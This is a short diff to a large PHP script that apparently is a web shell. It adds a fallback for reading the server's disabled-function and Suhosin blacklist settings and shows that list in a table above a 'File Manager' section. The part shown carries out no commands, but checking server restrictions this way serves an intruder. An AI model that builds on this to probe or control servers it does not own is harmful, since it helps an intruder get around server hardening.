@@ -157,12 +157,17 @@ function getPaths($root)
 
 #Checks if a function is/isn't disabled
 $disbls = @ini_get('disable_functions').','.@ini_get('suhosin.executor.func.blacklist');
+if ($disbls == ",")
+{
+	$disbls = get_cfg_var('disable_functions').','.get_cfg_var('suhosin.executor.func.blacklist');
+}
+$disbls = str_replace(" ", "", $disbls);
 $disblsArray = explode(",", $disbls);
 
 function checkIt($func)
 {
 	global $disblsArray;
-	
+
 	foreach ($disblsArray as $value)
 	{
 		if ($func == $value)
@@ -1567,8 +1572,19 @@ echo "
 </table>
 </td>
 </tr>
-</table>";
+</table>
+<table style='table-layout: fixed; word-wrap:break-word' class='flat-table flat-table-1' style='max-width: 500px;'>
+	<tr>
+		<th>Disabled</th>
+	</tr>
+	<tr>
+		<td>$disbls</td>
+	</tr>
+</table>
+";
+
 ?>
+
 <br><h3><A NAME='File Manager' href='#File Manager'>File Manager</A></h3>
 
 <?php
